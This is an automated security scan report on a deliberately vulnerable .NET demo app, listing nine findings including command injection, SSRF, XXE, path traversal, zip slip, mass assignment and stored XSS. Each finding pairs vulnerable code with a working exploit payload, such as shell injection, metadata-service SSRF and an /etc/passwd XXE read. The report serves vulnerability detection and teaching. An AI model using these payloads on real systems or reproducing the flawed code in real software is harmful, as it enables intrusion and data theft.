# 🔒 CodeMender Security Report

*Generated: 2026-08-20 09:54:34 UTC*

## Summary

**Total findings: 9**

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 1 |
| 🟠 HIGH | 8 |

| Status | Count |
|--------|-------|
| 🔴 OPEN | 9 |

## Findings

| ID | Severity | Confidence | Status | Fix | File | Title |
|----|----------|------------|--------|-----|------|-------|
| `006c3e7b` | 🔴 CRITICAL | 100% | OPEN | — | `DotnetSecurityFailures/Services/VulnerableCommandService.cs` | OS Command Injection in VulnerableCommandService via Shell Execution |
| `b810d38a` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/XssSvgController.cs` | Server-Side Request Forgery (SSRF) via SVG Image Processing |
| `6d089ba2` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/IdorController.cs` | Privilege Escalation via Mass Assignment in IdorController Registration |
| `c54ba3b3` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/ArbitraryFileWriteController.cs` | Arbitrary File Write via Path Traversal in ArbitraryFileWriteController |
| `e10c4aa6` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/XxeInjectionController.cs` | XML External Entity (XXE) Injection in XxeInjectionController |
| `44d878fb` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/ZipSlipController.cs` | Zip Slip (Arbitrary File Write) in ZipSlipController |
| `799c2792` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/SsrfController.cs` | Server-Side Request Forgery (SSRF) in SsrfController |
| `fcfd7312` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/PathTraversalController.cs` | Path Traversal (Arbitrary File Read) in PathTraversalController |
| `078eeaf6` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/VulnerableFileUploadController.cs` | Stored Cross-Site Scripting (XSS) via Unvalidated File Upload Content-Type |

## Details

### 1. 🔴 OS Command Injection in VulnerableCommandService via Shell Execution (`006c3e7b`)

- **Severity**: 🔴 CRITICAL
- **Status**: OPEN
- **Type**: Command Injection
- **File**: `DotnetSecurityFailures/Services/VulnerableCommandService.cs` (L21–79)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The Blazor component `CommandInjection.razor` allows a user to input an arbitrary string, which is then passed to `VulnerableCommandService.ExecuteCommandVulnerable(string userInput)`.
In this service, the input is directly concatenated to the shell execution arguments string:
- On Windows: `Arguments = $"/c echo Processing: {userInput}"`
- On Linux/macOS: `Arguments = $"-c \"echo Processing: {userInput}\""`
Since this execution utilizes a shell (`cmd.exe` or `/bin/sh`), shell metacharacters like `&`, `&&`, `;`, and `|` can be utilized by an attacker to execute arbitrary OS commands.

### Conceptual Exploit Payload
To execute `whoami` on Windows:
`test & whoami`

To execute `id` on Linux:
`test && id` or `test; id`

In the browser UI, typing `test && whoami` and clicking "Process Text" executes the command under the identity of the application process.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE CODE - for demonstration purposes
    public string ExecuteCommandVulnerable(string userInput)
    {
        try
        {
            var processInfo = new ProcessStartInfo
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                processInfo.FileName = "cmd.exe";
                processInfo.Arguments = $"/c echo Processing: {userInput}";
            }
            else
            {
                processInfo.FileName = "/bin/sh";
                processInfo.Arguments = $"-c \"echo Processing: {userInput}\"";
            }

            using var process = Process.Start(processInfo);
```

</details>

---

### 2. 🔴 Server-Side Request Forgery (SSRF) via SVG Image Processing (`b810d38a`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/XssSvgController.cs` (L35–116)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `XssSvgController.ProcessSvg` method parses user-supplied SVG content, identifies `<image>` tags with external `href` values, and executes an HTTP GET request to fetch each of those URLs.
Because this controller takes these SVG image URLs and fetches them server-side using an unvalidated `HttpClient` instance, it creates a Server-Side Request Forgery (SSRF) vulnerability. This vulnerability allows an attacker to interact with internal network assets, localhost services, and cloud metadata services.

### Conceptual Exploit Payload
To query the AWS Instance Metadata Service via an SVG file:
```http
POST /api/vulnerabilities/xss-svg/process HTTP/1.1
Content-Type: application/json

{
  "SvgContent": "<svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"http://169.254.169.254/latest/meta-data/\" /></svg>"
}
```

The application's server will parse the SVG and then perform an HTTP GET request to `http://169.254.169.254/latest/meta-data/` on behalf of the attacker, returning the metadata in the `externalRequests` response field.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE - Embeds external images by fetching them server-side
    // Real scenario: Creating standalone SVG files by embedding external resources
    [HttpPost("process")]
    [IgnoreAntiforgeryToken]
    public async Task<IActionResult> ProcessSvg([FromBody] SvgUploadRequest request)
    {
        LogDemoActivity("EmbedExternalImages", "Embedding external images into SVG (SSRF risk)");
        
        if (string.IsNullOrWhiteSpace(request.SvgContent))
        {
            return BadRequest(new { success = false, message = "SVG content is required" });
        }

        var externalRequests = new List<ExternalRequestInfo>();

        try
        {
            var doc = XDocument.Parse(request.SvgContent);
            var ns = XNamespace.Get("http://www.w3.org/2000/svg");

            var images = doc.Descendants(ns + "image")
                .Select(e => e.Attribute("href")?.Value ?? e.Attribute(XNamespace.Get("http://www.w3.org/1999/xlink") + "href")?.Value)
                .Where(href => !string.IsNullOrEmpty(href) && !href.StartsWith("data:"))
                .ToList();

            // DANGEROUS: Fetch each external URL (SSRF risk)
            foreach (var href in images)
            {
                var requestInfo = new ExternalRequestInfo
                {
                    Url = href,
                    IsInternal = IsInternalUrl(href)
                };

                try
                {
                    var response = await _httpClient.GetAsync(href);
```

</details>

---

### 3. 🔴 Privilege Escalation via Mass Assignment in IdorController Registration (`6d089ba2`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/IdorController.cs` (L43–75)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `IdorController.Register` method accepts a `RegistrationRequest` payload that contains a user-controllable `Role` parameter. 
The application registers the user and directly assigns this role (e.g., `Role = request.Role ?? "User"`) to the new user object without any validation or privilege checks.
This represents a Mass Assignment / Privilege Escalation vulnerability, where any self-registered user can set their role to `Admin` or `SuperAdmin` and obtain unauthorized administrative access.

### Conceptual Exploit Payload
To register a user with administrative privileges:
```http
POST /api/vulnerabilities/idor/register HTTP/1.1
Content-Type: application/json

{
  "Username": "attacker",
  "Email": "attacker@example.com",
  "Password": "SuperSecretPassword123",
  "Role": "Admin"
}
```

Response:
```json
{
  "success": true,
  "message": "User registered successfully with role: Admin",
  "userId": 1234,
  "username": "attacker",
  "email": "attacker@example.com",
  "role": "Admin",
  "isPrivileged": true
}
```

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: Accepts role from user input during registration!
    [HttpPost("register")]
    public IActionResult Register([FromBody] RegistrationRequest request)
    {
        LogDemoActivity("Register", $"Registering user: {request.Username} with role: {request.Role}");
        
        if (string.IsNullOrWhiteSpace(request.Username) || 
            string.IsNullOrWhiteSpace(request.Email) || 
            string.IsNullOrWhiteSpace(request.Password))
        {
            return BadRequest(new { success = false, message = "All fields are required" });
        }

        // VULNERABILITY: Directly using user-provided role without validation
        var user = new User
        {
            Id = new Random().Next(1000, 9999),
            Name = request.Username,
            Email = request.Email,
            Password = $"hashed_{request.Password}",
            Role = request.Role ?? "User" // User can control this!
        };
```

</details>

---

### 4. 🔴 Arbitrary File Write via Path Traversal in ArbitraryFileWriteController (`c54ba3b3`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Path Traversal
- **File**: `DotnetSecurityFailures/Controllers/ArbitraryFileWriteController.cs` (L28–76)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `ArbitraryFileWriteController.SaveBackup` method takes a `FileName` and `Content` from the request body and performs a direct `Path.Combine` to construct the destination `filePath` in the `Backups` directory.
It does not perform validation to prevent path traversal characters (such as `../` or `..\\`) from being included in the file name before writing the file contents to disk.
This allows an attacker to write or overwrite arbitrary files on the local filesystem (such as webroot files, system configuration files, or startup tasks) that the application process has permission to modify.

### Conceptual Exploit Payload
To write a file outside the Backups directory (for example, to the root directory or webroot):
```http
POST /api/vulnerabilities/arbitrary-file-write/save HTTP/1.1
Content-Type: application/json

{
  "FileName": "../../wwwroot/malicious_payload.html",
  "Content": "<h1>Hacked!</h1>"
}
```

This will write `malicious_payload.html` to the `wwwroot` directory, which can then be served statically.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    [HttpPost("save")]
    public IActionResult SaveBackup([FromBody] BackupRequest request)
    {
        LogDemoActivity("SaveBackup", $"Attempting to write file: {request.FileName}");
        
        if (string.IsNullOrWhiteSpace(request.FileName))
        {
            return BadRequest(new { success = false, message = "Filename is required" });
        }

        if (string.IsNullOrWhiteSpace(request.Content))
        {
            return BadRequest(new { success = false, message = "Content is required" });
        }

        try
        {
            // VULNERABLE: Direct path concatenation without validation
            var filePath = Path.Combine(_baseDirectory, request.FileName);
            
            System.IO.File.WriteAllText(filePath, request.Content);
```

</details>

---

### 5. 🔴 XML External Entity (XXE) Injection in XxeInjectionController (`e10c4aa6`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Controllers/XxeInjectionController.cs` (L44–91)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `XxeInjectionController.ProcessUserXml` and `ParseXml` methods allow processing of XML data supplied by users.
In both methods, XML entity resolution is explicitly configured with dangerous settings (`DtdProcessing = DtdProcessing.Parse` and `XmlResolver = new XmlUrlResolver()`, or direct `XmlDocument` with `XmlResolver` instantiated).
This configuration allows XML External Entity (XXE) injection attacks, where an attacker can supply an XML file with an external entity pointing to files on the host filesystem or internal network endpoints, leading to arbitrary file read or SSRF.

### Conceptual Exploit Payload
To read the local `/etc/passwd` file (or other known configuration file):
```http
POST /api/xxe/process-user HTTP/1.1
Content-Type: application/json

{
  "XmlContent": "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><name>&xxe;</name><email>attacker@example.com</email><bio>Hacked</bio></user>"
}
```

This will trigger the server to resolve the external entity and return the contents of the target file in the response.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    [HttpPost("process-user")]
    public IActionResult ProcessUserXml([FromBody] XmlRequest request)
    {
        LogDemoActivity("ProcessUserXml", "Processing XML with XmlResolver enabled (VULNERABLE)");

        if (string.IsNullOrWhiteSpace(request.XmlContent))
        {
            return BadRequest(new { Success = false, Error = "XML content is required" });
        }

        try
        {
            // VULNERABLE: Explicitly enabling XmlResolver
            var doc = new XmlDocument();
            doc.XmlResolver = new XmlUrlResolver(); // DANGEROUS!
            doc.LoadXml(request.XmlContent);

            var name = doc.SelectSingleNode("//user/name")?.InnerText ?? "";
            var email = doc.SelectSingleNode("//user/email")?.InnerText ?? "";
            var bio = doc.SelectSingleNode("//user/bio")?.InnerText ?? "";
```

</details>

---

### 6. 🔴 Zip Slip (Arbitrary File Write) in ZipSlipController (`44d878fb`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Path Traversal
- **File**: `DotnetSecurityFailures/Controllers/ZipSlipController.cs` (L60–101)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `ZipSlipController.ExtractZip` method extracts zip files uploaded by users.
During extraction, it computes the target path for each entry using `Path.GetFullPath(Path.Combine(ExtractDirectory, entry.FullName))` and saves the file via `entry.ExtractToFile(fullPath, overwrite: true)` without checking if the computed path escapes the target directory.
While the code does detect traversal and adds warnings afterwards, the extraction happens BEFORE any validation or rejection, meaning files are written/overwritten outside the extraction directory. This allows an attacker to write/overwrite arbitrary files on the system, potentially achieving remote code execution (RCE) or altering configurations.

### Conceptual Exploit Payload
An attacker can upload a zip file with an entry named:
`../../../../../../tmp/malicious.txt` or `../../wwwroot/js/malicious.js`

When extracted via:
```http
POST /api/zip/extract HTTP/1.1
Content-Type: multipart/form-data; boundary=boundary

--boundary
Content-Disposition: form-data; name="zipFile"; filename="exploit.zip"
Content-Type: application/zip

[ZIP DATA CONTAINING ENTRY WITH FILE PATH "../../../../tmp/malicious.txt"]
--boundary--
```

The file will be successfully written to `/tmp/malicious.txt` or another folder outside the intended extraction path.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
                    // VULNERABLE: No validation before extraction
                    var fullPath = Path.GetFullPath(Path.Combine(ExtractDirectory, entry.FullName));

                    var isTraversal = !fullPath.StartsWith(
                        normalizedTargetDir,
                        StringComparison.OrdinalIgnoreCase);

                    extractedFiles.Add(new ExtractedFileInfo
                    {
                        EntryName = entry.FullName,
                        ResolvedPath = fullPath,
                        IsTraversal = isTraversal,
                        WasExtracted = false
                    });

                    // VULNERABLE: Extract file WITHOUT validation
                    try
                    {
                        var directoryPath = Path.GetDirectoryName(fullPath);
                        if (!string.IsNullOrEmpty(directoryPath) && !Directory.Exists(directoryPath))
                        {
                            Directory.CreateDirectory(directoryPath);
                        }

                        entry.ExtractToFile(fullPath, overwrite: true);
```

</details>

---

### 7. 🔴 Server-Side Request Forgery (SSRF) in SsrfController (`799c2792`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/SsrfController.cs` (L29–75)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `SsrfController.FetchUrl` method accepts a `url` query parameter from the user and makes an HTTP GET request to that URL using an unvalidated HttpClient. 
An attacker can utilize this to trigger the server to make requests to internal resources, metadata services (e.g., `169.254.169.254` on AWS or other cloud environments), or internal APIs, leaking internal content and metadata.

### Conceptual Exploit Payload
To query the AWS Instance Metadata Service:
```http
GET /api/vulnerabilities/ssrf/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: localhost
```

To query an internal service running on port 8080:
```http
GET /api/vulnerabilities/ssrf/fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
Host: localhost
```

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: No URL validation - allows SSRF attacks
    [HttpGet("fetch")]
    public async Task<IActionResult> FetchUrl([FromQuery] string url)
    {
        LogDemoActivity("FetchUrl", $"Fetching URL: {url}");
        
        if (string.IsNullOrWhiteSpace(url))
        {
            return BadRequest(new { success = false, message = "URL is required" });
        }

        try
        {
            // VULNERABLE: Fetches ANY URL without validation
            var response = await _httpClient.GetAsync(url);
            var content = await response.Content.ReadAsStringAsync();

            return Ok(new
            {
                success = true,
                url = url,
                statusCode = (int)response.StatusCode,
                contentType = response.Content.Headers.ContentType?.ToString(),
                content = content.Length > 1000 ? content.Substring(0, 1000) + "..." : content,
                isVulnerable = IsInternalUrl(url)
            });
        }
```

</details>

---

### 8. 🔴 Path Traversal (Arbitrary File Read) in PathTraversalController (`fcfd7312`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Path Traversal
- **File**: `DotnetSecurityFailures/Controllers/PathTraversalController.cs` (L34–61)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The PathTraversalController.DownloadFile method accepts a `filename` parameter via a query string and directly uses it in a `Path.Combine` call to locate a file in the Documents directory.
No validation or sanitization of path traversal characters (like `../` or `..\\`) is performed.
An attacker can exploit this to read arbitrary files from the filesystem (e.g. system files like `appsettings.json` or other sensitive system configuration files) that the application process has permissions to read.

### Conceptual Exploit Payload
To read `appsettings.json` from the project root (relative to the `Documents` directory):
```http
GET /api/vulnerabilities/path-traversal/download?filename=../../appsettings.json HTTP/1.1
Host: localhost
```

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: Direct path concatenation without validation
    [HttpGet("download")]
    public IActionResult DownloadFile([FromQuery] string filename)
    {
        LogDemoActivity("DownloadFile", $"Attempting to download: {filename}");
        
        if (string.IsNullOrWhiteSpace(filename))
        {
            return BadRequest(new { success = false, message = "Filename is required" });
        }

        // VULNERABLE: User input directly concatenated to path
        var filePath = Path.Combine(DocumentsPath, filename);

        if (!System.IO.File.Exists(filePath))
        {
            return NotFound(new { success = false, message = "File not found" });
        }

        var fileContent = System.IO.File.ReadAllText(filePath);

        return Ok(new
        {
            success = true,
            requestedPath = filePath,
            filename = filename,
            content = fileContent
        });
    }
```

</details>

---

### 9. 🔴 Stored Cross-Site Scripting (XSS) via Unvalidated File Upload Content-Type (`078eeaf6`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/VulnerableFileUploadController.cs` (L57–75)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `VulnerableFileUploadController` allows anyone to upload files via a POST request to `/api/files/upload`. The uploaded files are saved to disk in a temporary uploads folder.
When viewing the uploaded files using GET `/api/files/view/{fileId}`, the server retrieves the stored file content and serves it with a hardcoded Content-Type header of `text/html`.
This allows an attacker to upload an HTML file containing malicious JavaScript, which is then served with the correct MIME type for execution in a web browser under the origin of the vulnerable application, leading to a Stored Cross-Site Scripting (XSS) vulnerability.

### Conceptual Exploit Payload
1. Send an HTTP POST request to upload a malicious payload:
```http
POST /api/files/upload HTTP/1.1
Content-Type: application/json

{
  "Filename": "xss.html",
  "Content": "<html><body><script>alert(document.domain)</script></body></html>"
}
```

Response will return a `fileId` and `viewUrl`, e.g., `/api/files/view/12345-6789-0abc`.

2. Direct a victim to navigate to the `viewUrl`:
```http
GET /api/files/view/12345-6789-0abc HTTP/1.1
```

The browser will execute the alert payload under the application's origin because the Content-Type header is set to `text/html`.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: Serves files without proper Content-Type validation
    [HttpGet("view/{fileId}")]
    public IActionResult ViewFile(string fileId)
    {
        if (!UploadedFiles.TryGetValue(fileId, out var uploadedFile))
        {
            return NotFound(new { success = false, message = "File not found" });
        }

        if (!System.IO.File.Exists(uploadedFile.FilePath))
        {
            return NotFound(new { success = false, message = "File not found on disk" });
        }

        var fileBytes = System.IO.File.ReadAllBytes(uploadedFile.FilePath);

        // VULNERABLE: Always serves as text/html without validation!
        // This allows XSS when HTML files with scripts are uploaded
        return File(fileBytes, "text/html");
    }
```

</details>

---

